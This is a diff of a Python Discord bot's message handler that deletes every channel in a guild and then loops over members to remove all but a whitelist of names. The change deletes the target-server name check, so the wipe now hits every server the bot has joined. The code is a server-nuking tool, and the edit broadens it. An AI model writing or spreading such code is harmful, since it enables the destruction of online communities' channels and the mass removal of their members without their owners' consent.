@@ -30,7 +30,7 @@ async def on_message(msg):
             text_channel_list = []
             
             for guild in client.guilds:
-                print('Checking {0} with {1}'.format(guild.name,targetServer))
+                
                 if True:
                     print('Found server {0}'.format(guild.name))
                     for channel in guild.channels:
@@ -42,7 +42,7 @@ async def on_message(msg):
                         except:
                             print('failed to delete channel {0}'.format(channel.name))
             for guild in client.guilds:
-                if guild.name == targetServer and deleteHuh:
+                if  deleteHuh:
                     for user in guild.members:
                         try:
                             if(deleteHuh and notMemberOf(user.name,['firez2469','MEE6','Pollmaster','Zira','Dyno','Dadys Boi','Experimental Games Bot'])):
